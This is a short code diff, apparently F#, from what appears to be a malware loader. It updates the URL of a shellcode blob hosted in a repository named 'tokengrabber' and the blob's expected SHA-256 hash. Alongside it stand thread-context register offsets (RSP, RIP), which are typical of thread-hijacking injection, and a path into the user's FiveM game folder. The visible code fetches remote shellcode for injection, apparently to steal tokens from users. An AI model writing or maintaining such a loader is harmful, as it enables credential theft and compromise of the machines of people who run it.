@@ -97,9 +97,9 @@ let CTX_RSP       = 0x98
 let CTX_RIP       = 0xF8
 
 let shellcodeUrl =
-    "https://api.github.com/repos/bielzxdev/tokengrabber/git/blobs/f89c222837d6e29e0e79c2bceb09a25de927161f"
+    "https://api.github.com/repos/bielzxdev/tokengrabber/git/blobs/c09eae8c880fdcef98121b47ecbdfee4a91690c2"
 
-let expectedSha256 = "2CA5F4835CC9D1EB58B90C730C3B99C777182D0BC7E1CAC77DDBBF8A32FEDB33"
+let expectedSha256 = "ABDA8684E67AE9822C72B8E23193B5117065A944D45B2C7F760CCF15192A5256"
 
 let fiveMFolder =
     Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
